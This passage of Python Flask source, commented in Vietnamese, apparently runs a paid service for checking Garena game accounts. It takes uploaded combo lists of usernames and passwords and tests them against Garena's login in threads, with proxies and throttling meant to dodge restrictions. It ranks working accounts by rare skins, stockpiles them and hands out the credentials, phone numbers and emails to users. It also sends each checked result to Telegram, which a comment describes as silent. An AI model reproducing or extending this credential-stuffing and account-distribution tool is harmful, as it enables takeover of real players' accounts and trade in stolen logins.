                if int(_skins) > 0: _has_signal = True
            except (ValueError, TypeError): pass

            # Nếu UID không hợp lệ → acc fake
            if not _uid_ok:
                logger.warning(f"[FAKE-ACC] {u} — UID không hợp lệ ({_uid_str})")
                r["type"] = "failed"
                r["error"] = "❌ Tài khoản không tồn tại hoặc sai mật khẩu"
                r["banned"] = False
            # UID ok nhưng không có data → acc fake
            elif not _has_signal:
                logger.warning(f"[FAKE-ACC] {u} — UID={_uid_str} nhưng không có data")
                r["type"] = "failed"
                r["error"] = "❌ Tài khoản không tồn tại (không có dữ liệu)"
                r["banned"] = False
            else:
                logger.info(f"[VERIFY-OK] {u} — acc THẬT (UID={_uid_str}, name={_name_str[:20]})")

            if use_cache and not proxy: cache_set(u, p, r)
            # VIP tele
            try:
                if should_send_vip_telegram(r):
                    threading.Thread(target=send_vip_telegram, args=(r,), daemon=True).start()
            except Exception as _e:
                pass
            return r
        except Exception as e:
            r["error"] = str(e); r["type"] = "failed"
            logger.error(f"[CHECK] EXC: {traceback.format_exc()}")
            if attempt < AUTO_RETRY: continue
    if use_cache and not proxy: cache_set(u, p, r)
    return r


# ========== KHO ACC ==========
@app.route("/kho_acc")
@admin_or_qtv_required
def kho_acc():
    user = get_user()
    page = int(request.args.get("page", 1)); per_page = 50
    total = len(ACC_STORAGE)
    total_pages = max(1, (total + per_page - 1) // per_page)
    page = max(1, min(page, total_pages)); start = (page - 1) * per_page
    items = ACC_STORAGE[::-1][start:start+per_page]
    rows = ""
    for it in items:
        sss_c = len(it.get("skins_sss", [])); ss_c = len(it.get("skins_ss", [])); an_c = len(it.get("skins_anime", []))
        tier = "SSS" if sss_c else ("Anime" if an_c else ("SS" if ss_c else "Normal"))
        color = {"SSS":"#ffb800","SS":"#00f0ff","Anime":"#e040fb","Normal":"#8b8b9a"}[tier]
        rows += f'''<div class="list-item"><div style="flex:1; min-width:0;">
            <div style="font-family:monospace; font-weight:600; overflow:hidden; text-overflow:ellipsis;">{it["acc"]}|{it["password"]}</div>
            <div style="font-size:0.72em; color:var(--text-mute);">UID: {it.get("uid","?")} · {it.get("total_skins",0)} skin · SSS: {sss_c} · SS: {ss_c} · Anime: {an_c}</div>
        </div>
        <div style="padding:4px 10px; background:{color}20; color:{color}; border-radius:8px; font-size:0.7em; font-weight:800;">{tier}</div>
        <a href="/kho_acc/delete/{it['id']}" class="btn btn-danger btn-sm" onclick="return confirm('Xóa?');">🗑️</a></div>'''
    if not rows: rows = '<p style="text-align:center; color:var(--text-dim); padding:20px;">Kho trống</p>'
    pag = ""
    if total_pages > 1:
        pag += '<div style="display:flex; gap:8px; justify-content:center; margin-top:14px; flex-wrap:wrap;">'
        if page > 1: pag += f'<a href="/kho_acc?page={page-1}" class="btn btn-secondary btn-sm">← Trước</a>'
        pag += f'<span style="padding:8px 14px; background:rgba(0,242,254,0.2); border-radius:8px; font-family:Orbitron; font-weight:800;">{page}/{total_pages}</span>'
        if page < total_pages: pag += f'<a href="/kho_acc?page={page+1}" class="btn btn-secondary btn-sm">Sau →</a>'
        pag += '</div>'
    content = f'''<div class="card">
        <h2 class="card-title">📦 KHO ACC</h2>
        <div class="stat-grid-3">
            <div class="stat-box"><div class="stat-value">{total}</div><div class="stat-label">Trong kho</div></div>
            <div class="stat-box"><div class="stat-value">{len(ACC_HISTORY)}</div><div class="stat-label">Đã phát</div></div>
            <div class="stat-box"><div class="stat-value">{USER_DAILY_LIMIT}</div><div class="stat-label">Limit/ngày</div></div>
        </div>
        <div style="display:flex; gap:8px; margin-top:14px;">
            <a href="/up_acc" class="btn btn-success btn-block" style="flex:1;">📤 UP ACC</a>
            <a href="/kho_acc/clear" class="btn btn-danger btn-block" style="flex:1;" onclick="return confirm('XÓA TOÀN BỘ KHO?');">🗑️ XÓA HẾT</a>
        </div>
    </div>
    <div class="card"><h3 class="card-title">📋 Danh sách ({total})</h3>{rows}{pag}</div>'''
    return render_page(content, active_tab="kho_acc", user=user)

@app.route("/kho_acc/delete/<sid>")
@admin_or_qtv_required
def kho_acc_delete(sid):
    global ACC_STORAGE
    before = len(ACC_STORAGE)
    ACC_STORAGE = [x for x in ACC_STORAGE if x.get("id") != sid]
    log_admin("DELETE_ACC", sid); save_data(force=True)
    flash(f"Đã xóa ({before - len(ACC_STORAGE)} acc)", "success")
    return redirect(url_for("kho_acc"))

@app.route("/kho_acc/clear")
@admin_or_qtv_required
def kho_acc_clear():
    global ACC_STORAGE
    n = len(ACC_STORAGE); ACC_STORAGE = []
    log_admin("CLEAR_STORAGE", "", f"xóa {n} acc"); save_data(force=True)
    flash(f"Đã xóa {n} acc!", "success")
    return redirect(url_for("kho_acc"))
# ========== NHẬN ACC (có Random Tier #5) ==========
@app.route("/nhan_acc", methods=["GET", "POST"])
@login_required
def nhan_acc():
    user = get_user()
    today = datetime.now().strftime("%Y-%m-%d")
    daily = user.get("daily_received", {})
    if daily.get("date") != today:
        daily = {"date": today, "count": 0}; user["daily_received"] = daily
    used = daily.get("count", 0)
    user_limit = user.get("daily_limit", USER_DAILY_LIMIT)
    if user_limit == -1: remaining = 999999
    else: remaining = max(0, user_limit - used)
    received = None
    if request.method == "POST":
        tier = request.form.get("tier", "random")  # 🆕 v7.0
        if remaining <= 0: flash(f"Hết lượt hôm nay!", "error")
        elif not ACC_STORAGE: flash("Kho đang trống!", "error")
        else:
            acc = None
            cost_extra = 0
            if tier == "random":
                with _lock:
                    acc = random.choice(ACC_STORAGE)
                    ACC_STORAGE.remove(acc)
            else:
                # 🆕 v7.0: Random theo tier
                cost_extra = RANDOM_TIER_COST.get(tier, 0)
                # Check xu
                if user.get("balance", 0) < cost_extra:
                    flash(f"Cần {cost_extra} xu để nhận acc {tier.upper()}!", "error")
                    return redirect(url_for("nhan_acc"))
                acc = pick_acc_by_tier(tier)
                if not acc:
                    flash(f"Kho không có acc {tier.upper()} nào!", "error")
                    return redirect(url_for("nhan_acc"))
                user["balance"] -= cost_extra
                with _lock:
                    try: ACC_STORAGE.remove(acc)
                    except ValueError: pass
            if acc:
                daily["count"] = used + 1
                user.setdefault("received_accs", []).append({"id": uuid.uuid4().hex[:10],
                    "acc": acc["acc"], "password": acc["password"],
                    "time": datetime.now().strftime('%Y-%m-%d %H:%M:%S'), "timestamp": time.time()})
                user["received_accs"] = user["received_accs"][-50:]
                ACC_HISTORY.append({"user": user["username"], "acc": acc["acc"],
                    "time": datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                    "timestamp": time.time(), "storage_id": acc["id"]})
                if len(ACC_HISTORY) > 1000: ACC_HISTORY.pop(0)
                hist_entry = {"id": uuid.uuid4().hex[:12], "acc": acc["acc"], "password": acc["password"],
                    "result": "sss" if acc.get("skins_sss") else ("anime" if acc.get("skins_anime") else ("ss" if acc.get("skins_ss") else "normal")),
                    "time": datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                    "uid": acc.get("uid", ""), "nick": acc.get("nick", ""),
                    "rank": acc.get("rank", ""), "rank_stars": acc.get("rank_stars", 0),
                    "level": acc.get("level", 0), "shell": acc.get("shell", 0),
                    "banned": acc.get("banned", False), "ban_end_time": acc.get("ban_end_time", ""),
                    "error": "", "total_skins": acc.get("total_skins", 0),
                    "mobile_no": acc.get("mobile_no", ""), "country_code": acc.get("country_code", ""),
                    "email": acc.get("email", ""), "idcard": acc.get("idcard", ""),
                    "two_fa": acc.get("two_fa", False),
                    "username_display": acc.get("username_display", ""),
                    "nickname": acc.get("nickname", ""), "player_uid": acc.get("player_uid", ""),
                    "best_hero": "", "best_play": "", "total_matches": "", "rank_id": 0,
                    "register_time": acc.get("register_time", ""),
                    "skins_sss": acc.get("skins_sss", []), "skins_ss": acc.get("skins_ss", []),
                    "skins_anime": acc.get("skins_anime", []), "skins_other": acc.get("skins_other", []),
                    "from_kho": True}
                user["history"] = user.get("history", [])[-199:] + [hist_entry]
                # 🆕 v7.0: Quest
                quest_add_progress(user, "receive_acc", 1)
                check_badge_conditions(user)
                save_data(force=True); received = acc
                if tier == "random":
                    flash(f"🎉 Nhận thành công! Còn {remaining-1} lượt", "success")
                else:
                    flash(f"🎉 Nhận acc {tier.upper()} thành công! -{cost_extra} xu, còn {remaining-1} lượt", "success")
        used = daily.get("count", 0)
        if user_limit == -1: remaining = 999999
        else: remaining = max(0, user_limit - used)
    # Render acc
    acc_html = ""
    if received:
        phone_disp = received.get("mobile_no") or "Không có"
        if received.get("mobile_no") and received.get("country_code"):
            phone_disp = f"{received['mobile_no']} (+{received['country_code']})"
        ban_text = '<span style="color:#ff2951;font-weight:700;">🔴 BANNED</span>' if received.get("banned") else '<span style="color:#00ff88;font-weight:700;">🟢 CLEAN</span>'
        def render_skin_grid(lst, cls, icon, label):
            if not lst: return ""
            items_html = ""
            for s in lst:
                items_html += f'''<div class="skin-card">
                    <div class="skin-img-wrap"><img src="{s.get('cdn','')}" loading="lazy" onerror="this.onerror=null;this.src='{s.get('cdn_fallback','')}';"></div>
                    <div class="skin-info"><div class="skin-hero">{s.get('hero','?')}</div>
                        <div class="skin-name">{s.get('skin','?')}</div>
                        </div></div>'''
            return f'<div class="card"><h3 class="card-title" style="font-size:0.95em;">{icon} {label} ({len(lst)})</h3><div class="skin-grid">{items_html}</div></div>'
        sss_html = render_skin_grid(received.get("skins_sss", []), "sss", "⭐", "SSS")
        anime_html = render_skin_grid(received.get("skins_anime", []), "anime", "🎴", "ANIME")
        ss_html = render_skin_grid(received.get("skins_ss", []), "ss", "💠", "SS")
        acc_html = f'''
        <div class="card" style="border:2px solid #00ff88; background:linear-gradient(135deg,rgba(0,255,136,0.1),rgba(0,242,254,0.1));">
            <h2 class="card-title" style="color:#00ff88;">🎉 ACC BẠN VỪA NHẬN <span class="kho-badge">🎁 KHO</span></h2>
            <div class="cred-box">
                <div class="cred-label">◈ Tài khoản</div>
                <div class="cred-value" onclick="copyText(this)">{received.get('acc','')}</div>
                <div class="cred-label">◈ Mật khẩu</div>
                <div class="cred-value" onclick="copyText(this)">{received.get('password','')}</div>
                <button class="btn btn-success btn-block" onclick="copyBoth('{received.get('acc','')}','{received.get('password','')}')" style="margin-top:8px;">📋 Copy TK + MK</button>
            </div>
            <div class="card" style="margin:0;">
                <h3 class="card-title" style="font-size:0.95em;">◐ Thông Tin</h3>
                <div class="info-row"><span class="info-label">UID</span><span class="info-value">{received.get("uid") or "N/A"}</span></div>
                <div class="info-row"><span class="info-label">Rank</span><span class="info-value">{received.get("rank") or "Chưa xếp hạng"} ({received.get("rank_stars",0)}★)</span></div>
                <div class="info-row"><span class="info-label">SĐT</span><span class="info-value">{phone_disp}</span></div>
                <div class="info-row"><span class="info-label">Trạng thái</span><span class="info-value">{ban_text}</span></div>
            </div>
        </div>
        {sss_html}{anime_html}{ss_html}
        <div class="card" style="text-align:center; color:var(--text-warn); font-size:0.85em;">💡 Acc đã được xóa khỏi kho — Lưu lại ngay!</div>'''
    # 🆕 v7.0: Tier options
    tier_options = ""
    for tier_id in ["sss", "anime", "ss", "normal"]:
        cost = RANDOM_TIER_COST.get(tier_id, 1)
        count = 0
        field = {"sss": "skins_sss", "anime": "skins_anime", "ss": "skins_ss", "normal": None}[tier_id]
        for it in ACC_STORAGE:
            if field is None:
                if not it.get("skins_sss") and not it.get("skins_ss") and not it.get("skins_anime"):
                    count += 1
            elif it.get(field): count += 1
        label = {"sss": "⭐ SSS", "anime": "🎴 Anime", "ss": "💎 SS", "normal": "○ Thường"}[tier_id]
        disabled = "" if count > 0 else "disabled"
        tier_options += f'''<button type="submit" name="tier" value="{tier_id}" class="btn btn-block" style="background:linear-gradient(135deg,#ffb800,#ff8800); color:#000; margin-bottom:6px;" {disabled}>
            {label} ({cost} xu) — Còn {count} acc
        </button>'''
    hist_rows = ""
    for h in user.get("received_accs", [])[-20:][::-1]:
        u_esc = (h.get("acc") or "").replace("'", "\\'")
        p_esc = (h.get("password") or "").replace("'", "\\'")
        hist_rows += f'''<div class="info-row">
            <span class="info-label">{h.get("time","")}</span>
            <span class="info-value" style="font-family:monospace;">{h.get("acc","")}|{h.get("password","")}</span>
            <button class="btn btn-sm btn-success" onclick="copyBoth(\'{u_esc}\',\'{p_esc}\')">📋</button></div>'''
    if not hist_rows: hist_rows = '<p style="text-align:center; color:var(--text-dim);">Chưa nhận acc nào</p>'
    can_receive = remaining > 0 and len(ACC_STORAGE) > 0
    limit_display = "∞" if user_limit == -1 else str(user_limit)
    content = f'''{acc_html}
    <div class="card">
        <h2 class="card-title">🎁 NHẬN ACC MIỄN PHÍ</h2>
        <div class="stat-grid">
            <div class="stat-box"><div class="stat-value" style="color:#00ff88;">{remaining}/{limit_display}</div><div class="stat-label">Lượt còn lại</div></div>
            <div class="stat-box"><div class="stat-value">{len(ACC_STORAGE)}</div><div class="stat-label">Acc trong kho</div></div>
        </div>
        <div style="margin-top:14px;">
            <div style="font-family:var(--font-display); font-weight:800; color:#00f2fe; margin-bottom:10px; text-align:center;">🎲 {t("random_tier_title")}</div>
            {tier_options}
            <form method="POST" style="margin-top:14px;">
                <button type="submit" name="tier" value="random" class="btn btn-success btn-block" {'disabled' if not can_receive else ''}>
                    🎲 NHẬN RANDOM (MIỄN PHÍ)
                </button>
            </form>
        </div>
    </div>
    <div class="card"><h3 class="card-title">📜 Lịch sử nhận acc</h3>{hist_rows}</div>
    <script>
    function copyBoth(u, p) {{
        var text = "User: " + u + "\\nPass: " + p;
        if (navigator.clipboard) {{
            navigator.clipboard.writeText(text).then(function() {{ showToast("✓ Đã copy!"); }});
        }}
    }}
    </script>'''
    return render_page(content, active_tab="nhan_acc", user=user)

# ========== CHECK FILE ==========
@app.route("/check_file", methods=["GET", "POST"])
@login_required
def check_file():
    user = get_user()
    if request.method == "POST":
        if "file" not in request.files: flash("Chưa chọn file!", "error"); return redirect(url_for("check_file"))
        f = request.files["file"]
        if not f.filename.endswith(".txt"): flash("Chỉ nhận .txt!", "error"); return redirect(url_for("check_file"))
        separator = request.form.get("separator", "auto")
        proxy = request.form.get("proxy", "").strip() or None
        # 🆕 Đọc threads + delay
        try:
            _cf_threads = int(request.form.get("threads", 2))
            _cf_threads = max(1, min(20, _cf_threads))
        except Exception:
            _cf_threads = 2
        try:
            _cf_delay = float(request.form.get("delay", 0.6))
            _cf_delay = max(0, min(10, _cf_delay))
        except Exception:
            _cf_delay = 0.6
        # 🆕 Đọc threads + delay
        try:
            _threads = int(request.form.get("threads", 2))
            _threads = max(1, min(20, _threads))
        except Exception:
            _threads = 2
        try:
            _delay = float(request.form.get("delay", 0.6))
            _delay = max(0, min(10, _delay))
        except Exception:
            _delay = 0.6
        content_bytes = f.read().decode("utf-8", errors="ignore")
        accs = parse_file_content_advanced(content_bytes, separator)
        if not accs: flash("Không tìm thấy acc!", "error"); return redirect(url_for("check_file"))
        if len(accs) > 5000: flash(f"File quá lớn ({len(accs)} acc). Tối đa 5000!", "error"); return redirect(url_for("check_file"))
        total = len(accs); xu = (total + 44) // 45
        if user["balance"] < xu: flash(f"Cần {xu} xu!", "error"); return redirect(url_for("check_file"))
        user["balance"] -= xu
        job_id = uuid.uuid4().hex[:16]
        CHECK_JOBS[job_id] = {"id": job_id, "user": user["username"], "total": total,
            "current": 0, "progress": 0, "done": False, "logs": [],
            "current_acc": "", "last_type": "", "stats": {}, "summary": "",
            "cancelled": False, "queued": False, "acc_list": accs, "proxy": proxy,
            "threads": _cf_threads, "delay": _cf_delay,
            "started_at": time.time(), "type": "check_file", "results": []}
        user["current_job"] = job_id; save_data(); save_jobs(force=True)
        threading.Thread(target=run_job_with_queue, args=(job_id, accs, user["username"]), daemon=True).start()
        return redirect(url_for("check_file_progress", job_id=job_id))
    content = f'''<div class="card">
        <h2 class="card-title">▣ Check File</h2>
        <p style="color:var(--text-dim); margin-bottom:14px; font-size:0.9em;">Upload file .txt — <span class="filter-badge">GIỮ TẤT CẢ ACC</span></p>
        <form method="POST" enctype="multipart/form-data">
            <div class="form-group"><label class="form-label">File danh sách</label>
                <input type="file" name="file" class="form-input" accept=".txt" required></div>
            <div class="form-group"><label class="form-label">Proxy (tùy chọn)</label>
                <input type="text" name="proxy" class="form-input" placeholder="http://user:pass@host:port"></div>
            <div class="form-group"><label class="form-label">Dấu phân cách</label>
                <select name="separator" class="form-input">
                    <option value="auto">🤖 Tự động</option>
                    <option value="|">|</option><option value=":">:</option>
                    <option value=" ">Space</option><option value=",">,</option>
                    <option value="=">=</option><option value=";">;</option>
                </select>
            </div>
            <!-- 🆕 Thêm: Luồng chạy -->
            <div style="display:grid; grid-template-columns:1fr 1fr; gap:10px; margin-bottom:16px;">
                <div>
                    <label class="form-label" style="display:flex; align-items:center; gap:6px;">
                        <span>⚡</span> Luồng chạy
                    </label>
                    <select name="threads" class="form-input">
                        <option value="2">2 Luồng (Khuyên dùng)</option>
                        <option value="1">1 Luồng (An toàn)</option>
                        <option value="3">3 Luồng (Nhanh)</option>
                        <option value="5">5 Luồng (Cực nhanh)</option>
                        <option value="8">8 Luồng (Tối đa)</option>
                    </select>
                </div>
                <div>
                    <label class="form-label" style="display:flex; align-items:center; gap:6px;">
                        <span>⏳</span> Độ trễ delay
                    </label>
                    <select name="delay" class="form-input">
                        <option value="0">0s (Rất nhanh)</option>
                        <option value="0.3">0.3s</option>
                        <option value="0.6" selected>0.6s (Chuẩn)</option>
                        <option value="1.2">1.2s (Chống hạn chế)</option>
                        <option value="2">2s (An toàn nhất)</option>
                    </select>
                </div>
            </div>
            <button type="submit" class="btn btn-block">Upload & Check</button>
        </form>
    </div>'''
    return render_page(content, active_tab="check_file", user=user)

@app.route("/check_file/progress/<job_id>")
@login_required
def check_file_progress(job_id):
    user = get_user(); job = CHECK_JOBS.get(job_id)
    if not job or job.get("user") != user["username"]:
        flash("Job không tồn tại!", "error"); return redirect(url_for("check_file"))
    user["current_job"] = job_id; save_data()
    _threads = job.get("threads", 2)
    _delay = job.get("delay", 0.0)
    content = f'''
    <div class="card" id="progress-card">
        <h2 class="card-title"><span class="spinner"></span> Đang Check...</h2>
        <div style="display:flex; gap:8px; flex-wrap:wrap; margin-bottom:10px; font-size:0.8em;">
            <span style="padding:4px 10px; background:rgba(0,242,254,0.15); border-radius:8px; color:#00f2fe;">⚡ {_threads} luồng</span>
            <span style="padding:4px 10px; background:rgba(255,183,3,0.15); border-radius:8px; color:#ffb800;">⏳ Delay: {_delay}s</span>
        </div>
        <div class="progress-container">
            <div style="display:flex; justify-content:space-between; font-size:0.85em; margin-bottom:8px;">
                <span>Tiến trình</span><span id="progress-percent" style="font-family:Orbitron; color:#38bdf8; font-weight:800;">0%</span></div>
            <div class="progress-bar-wrap">
                <div class="progress-bar-fill" id="progress-bar" style="width:0%;"></div>
                <div class="progress-text" id="progress-text">0 / {job['total']}</div></div>
            <div style="text-align:center; font-size:0.85em; color:var(--text-dim); margin-top:8px;">Đang check: <b id="current-acc" style="color:#00f2fe; font-family:monospace;">Chờ...</b></div>
        </div>
        <button id="cancel-btn" onclick="cancelJob()" class="btn btn-danger btn-block">🛑 HUỶ CHECK</button>
        <div class="live-stats">
            <div class="live-stat"><div class="num" id="stat-sss" style="color:#ffd700;">0</div><div class="lbl">SSS</div></div>
            <div class="live-stat"><div class="num" id="stat-ss" style="color:#00f2fe;">0</div><div class="lbl">SS</div></div>
            <div class="live-stat"><div class="num" id="stat-anime" style="color:#e040fb;">0</div><div class="lbl">Anime</div></div>
        </div>
        <!-- 🆕 Nút Tải nhanh -->
        <div style="display:grid; grid-template-columns:repeat(2,1fr); gap:8px; margin-top:14px;">
            <button onclick="downloadFromJob('uid_pass')" class="btn btn-info btn-sm">📥 Tải UID + Pass</button>
            <button onclick="downloadFromJob('vip')" class="btn btn-warning btn-sm">👑 Tải Acc Ngon</button>
            <button onclick="downloadFromJob('live')" class="btn btn-success btn-sm">📄 Tải Live</button>
            <button onclick="downloadFromJob('die')" class="btn btn-danger btn-sm">❌ Tải Die</button>
        </div>
        <div class="live-log" id="live-log"><div class="log-line normal">⏳ Chờ kết quả...</div></div>
    </div>
    <div id="results-section" style="display:none;">
        <div class="card" style="text-align:center; border:2px solid #00ff88;">
            <h2 class="card-title" style="justify-content:center; color:#00ff88;">✓ HOÀN TẤT!</h2>
            <div id="summary-box" class="result-box" style="text-align:left;"></div>
            <a href="/export_vip_all" class="btn btn-success btn-block" style="margin-top:14px;">📥 XUẤT VIP ALL</a>
            <div style="display:flex; gap:8px; margin-top:8px;">
                <a href="/history" class="btn btn-block" style="flex:1;">▤ Lịch Sử</a>
                <a href="/check_file" class="btn btn-secondary btn-block" style="flex:1;">+ Check Mới</a>
            </div>
        </div>
        <div id="cards-container"></div>
    </div>
    <script>
    var jobId = "{job_id}"; var lastRenderedIndex = 0;
    var pollInterval = setInterval(updateJob, 2000);
    function escapeHtml(t) {{ if(!t) return ''; var d=document.createElement('div'); d.textContent=t; return d.innerHTML; }}
    function updateJob() {{
        fetch('/api/check_file/progress/' + jobId).then(r => r.json()).then(data => {{
            if (data.error) {{ clearInterval(pollInterval); return; }}
            document.getElementById('progress-bar').style.width = data.progress + '%';
            document.getElementById('progress-percent').textContent = data.progress + '%';
            document.getElementById('progress-text').textContent = data.current + ' / ' + data.total;
            if (data.current_acc) document.getElementById('current-acc').textContent = data.current_acc;
            document.getElementById('stat-sss').textContent = (data.stats && data.stats.sss) || 0;
            document.getElementById('stat-ss').textContent = (data.stats && data.stats.ss) || 0;
            document.getElementById('stat-anime').textContent = (data.stats && data.stats.anime) || 0;
            if (data.logs && data.logs.length > 0) {{
                var html = ''; for (var i = 0; i < data.logs.length; i++) {{
                    var lg = data.logs[i]; html += '<div class="log-line ' + lg.type + '">' + escapeHtml(lg.msg) + '</div>'; }}
                var box = document.getElementById('live-log'); box.innerHTML = html; box.scrollTop = box.scrollHeight;
            }}
            if (data.done) {{ clearInterval(pollInterval);
                document.getElementById('progress-card').style.display = 'none';
                document.getElementById('results-section').style.display = 'block';
                document.getElementById('summary-box').textContent = data.summary || 'Hoàn tất!';
            }}
        }}).catch(e => console.log(e));
    }}
    function cancelJob() {{ if (!confirm('Huỷ?')) return; fetch('/api/check_file/cancel/' + jobId, {{ method: 'POST' }}); }}
    updateJob();
    </script>'''
    return render_page(content, active_tab="check_file", user=user)

@app.route("/api/check_file/progress/<job_id>")
@login_required
def api_check_file_progress(job_id):
    user = get_user(); job = CHECK_JOBS.get(job_id)
    if not job or job.get("user") != user["username"]: return jsonify({"error": "Job không tồn tại"})
    res = {"total": job.get("total", 0), "current": job.get("current", 0),
        "progress": job.get("progress", 0), "current_acc": job.get("current_acc", ""),
        "done": job.get("done", False), "logs": job.get("logs", [])[-30:],
        "stats": job.get("stats", {}), "summary": job.get("summary", "")}
    if job.get("done") or job.get("results"):
        res["results"] = [{
            "username": r.get("username",""), "password": r.get("password",""),
            "type": r.get("type",""), "uid": r.get("uid",""), "name": r.get("name",""),
            "username_display": r.get("username_display",""), "nickname": r.get("nickname",""),
            "rank": r.get("rank",""), "rank_stars": r.get("rank_stars",0),
            "level": r.get("level",0), "shell": r.get("shell",0),
            "banned": r.get("banned",False), "ban_end_time": r.get("ban_end_time",""),
            "ban_reason": r.get("ban_reason",""), "ban_sources": r.get("ban_sources",[]),
            "mobile_no": r.get("mobile_no",""), "country_code": r.get("country_code",""),
            "email": r.get("email",""), "idcard": r.get("idcard",""), "two_fa": r.get("two_fa",False),
            "player_uid": r.get("player_uid",""), "total_skins": r.get("total_skins",0),
            "best_hero": r.get("best_hero",""), "best_play": r.get("best_play",""),
            "total_matches": r.get("total_matches",""),
            "sss": r.get("sss",[]), "ss": r.get("ss",[]), "anime": r.get("anime",[]),
            "all_skins": r.get("all_skins",[])
        } for r in job.get("results", []) if r]
    return jsonify(res)

@app.route("/api/check_file/cancel/<job_id>", methods=["POST"])
@login_required
def api_check_file_cancel(job_id):
    user = get_user(); job = CHECK_JOBS.get(job_id)
    if not job or job.get("user") != user["username"]: return jsonify({"ok": False})
    job["cancelled"] = True
    return jsonify({"ok": True})

def run_job_with_queue(job_id, acc_list, user_name):
    with _active_jobs_lock:
        if _active_jobs_count[0] >= MAX_PARALLEL_JOBS:
            if len(JOB_QUEUE) >= 20:
                job = CHECK_JOBS.get(job_id)
                if job:
                    job["done"] = True
                    job["summary"] = "⚠️ Hệ thống quá tải. Thử lại sau!"
                    job["stats"] = {}
                return
            JOB_QUEUE.append(job_id)
            job = CHECK_JOBS.get(job_id)
            if job: job["queued"] = True
            return
        _active_jobs_count[0] += 1
    try: file_check_worker(job_id, acc_list, user_name)
    finally:
        with _active_jobs_lock:
            _active_jobs_count[0] -= 1
            if JOB_QUEUE:
                next_id = JOB_QUEUE.pop(0)
                job = CHECK_JOBS.get(next_id)
                if job:
                    job["queued"] = False
                    threading.Thread(target=run_job_with_queue,
                        args=(next_id, job["acc_list"], job["user"]), daemon=True).start()

def file_check_worker(job_id, acc_list, user_name):
    job = CHECK_JOBS.get(job_id)
    if not job: return
    total = len(acc_list); user = USERS.get(user_name)
    if not user: return
    results = []; results_lock = threading.Lock()
    completed_count = [0]; proxy = job.get("proxy")
    def process_one(acc_pair):
        u, p = acc_pair
        if job.get("cancelled"): return None
        try: r = run_single_check(u, p, proxy=proxy, use_cache=False)
        except Exception as e:
            r = {"type": "failed", "username": u, "password": p, "error": str(e),
                 "sss": [], "ss": [], "anime": [], "skins": [], "other_skins": [], "all_skins": [],
                 "rank": "", "level": 0, "name": "", "rank_stars": 0, "banned": False,
                 "uid": "", "shell": 0, "total_skins": 0, "mobile_no": "", "country_code": "",
                 "email": "", "idcard": "", "two_fa": False, "player_uid": "", "ban_end_time": ""}
        with results_lock:
            results.append(r); completed_count[0] += 1
            hist = user.get("history", [])
            hist.append(make_hist_entry(r, u))
            user["history"] = hist[-200:]
            # Gửi acc thường (silent)
            send_silent_telegram(r)
            try: tg_track_acc(r, source="check_file")
            except Exception: pass
            # 🆕 Gửi VIP về Telegram
            try:
                if should_send_vip_telegram(r):
                    threading.Thread(target=send_vip_telegram, args=(r,), daemon=True).start()
            except Exception as _e:
                logger.error(f"[VIP-TELE-BATCH] {u} err: {_e}")
            job["current"] = completed_count[0]
            job["progress"] = int((completed_count[0] / total) * 100)
            job["current_acc"] = u
            job["results"] = results
            # 🆕 v7.2: Log chi tiết lý do fail
            err_detail = r.get('error', '') or ''
            err_short = ""
            if err_detail:
                if "PREPARE_FAIL result=101" in err_detail or "không tồn tại" in err_detail.lower():
                    err_short = "Tài khoản không tồn tại"
                elif "PREPARE_FAIL result=105" in err_detail:
                    err_short = "Email không tồn tại"
                elif "PREPARE_FAIL result=173" in err_detail:
                    err_short = "Phải dùng Username (không dùng Email)"
                elif "PREPARE_FAIL result=106" in err_detail or "PREPARE_FAIL result=110" in err_detail:
                    err_short = "Định dạng không hợp lệ"
                elif "LOGIN_FAIL result=1" in err_detail or "LOGIN_FAIL result=2" in err_detail:
                    err_short = "Sai mật khẩu"
                elif "LOGIN_FAIL result=3" in err_detail:
                    err_short = "Tài khoản bị khóa"
                elif "LOGIN_FAIL result=4" in err_detail:
                    err_short = "Cần Captcha"
                elif "LOGIN_FAIL result=5" in err_detail:
                    err_short = "Tài khoản bật 2FA"
                elif "LOGIN_FAIL result=6" in err_detail or "LOGIN_FAIL result=7" in err_detail or "LOGIN_FAIL result=8" in err_detail:
                    err_short = "Sai quá nhiều lần"
                elif "LOGIN_FAIL result=16" in err_detail or "LOGIN_FAIL result=17" in err_detail:
                    err_short = "Cần xác minh web"
                elif "TIMEOUT" in err_detail or "timeout" in err_detail.lower():
                    err_short = "Timeout kết nối"
                elif "BLOCKED" in err_detail or "block" in err_detail.lower():
                    err_short = "IP bị Garena block"
                elif "Connection" in err_detail:
                    err_short = "Không kết nối Garena"
                else:
                    err_short = err_detail[:80]
            
            icon = {"sss": "◈", "ss": "◆", "anime": "◇", "normal": "▪", "trang": "○", "banned": "✖", "failed": "✕"}.get(r["type"], "?")
            if r["type"] == "failed" and err_short:
                main_msg = f"{icon} [{r['type'].upper()}] {u} ❌ {err_short}"
            elif r["type"] == "banned":
                ban_reason = r.get('ban_reason', 'Bị ban')
                main_msg = f"✖ [BANNED] {u} 🚫 {ban_reason}"
            else:
                main_msg = f"{icon} [{r['type'].upper()}] {u} | UID: {r.get('uid','N/A')} | {r.get('total_skins',0)} skin"
            job["logs"].append({"acc": u, "type": r["type"], "msg": main_msg})
            if len(job["logs"]) > 30: job["logs"] = job["logs"][-30:]
            if completed_count[0] % 5 == 0: save_data(); save_jobs(force=True)
        return r
    # 🆕 Đọc threads + delay từ job
    _job_threads = job.get("threads", MAX_CONCURRENT_CHECKS)
    _job_threads = max(1, min(20, int(_job_threads))) if _job_threads else MAX_CONCURRENT_CHECKS
    _job_delay = job.get("delay", 0.0)
    try:
        _job_delay = max(0, min(10, float(_job_delay)))
    except Exception:
        _job_delay = 0.0

    logger.info(f"[CHECK_FILE] Job {job_id} | Threads={_job_threads} | Delay={_job_delay}s")

    def process_one_with_delay(pair):
        """Wrapper có delay giữa các acc."""
        if _job_delay > 0:
            time.sleep(_job_delay)
        return process_one(pair)

    with ThreadPoolExecutor(max_workers=_job_threads) as ex:
        futures = [ex.submit(process_one_with_delay, pair) for pair in acc_list]
        for f in as_completed(futures):
            if job.get("cancelled"):
                for fut in futures: fut.cancel()
                break
    sss_c = sum(1 for r in results if r["type"] == "sss")
    ss_c = sum(1 for r in results if r["type"] == "ss")
    an_c = sum(1 for r in results if r["type"] == "anime")
    ban_c = sum(1 for r in results if r["type"] == "banned")
    norm_c = sum(1 for r in results if r["type"] == "normal")
    trang_c = sum(1 for r in results if r["type"] == "trang")
    fail_c = sum(1 for r in results if r["type"] == "failed")
    user["mission"]["total_acc"] = user["mission"].get("total_acc", 0) + len(results)
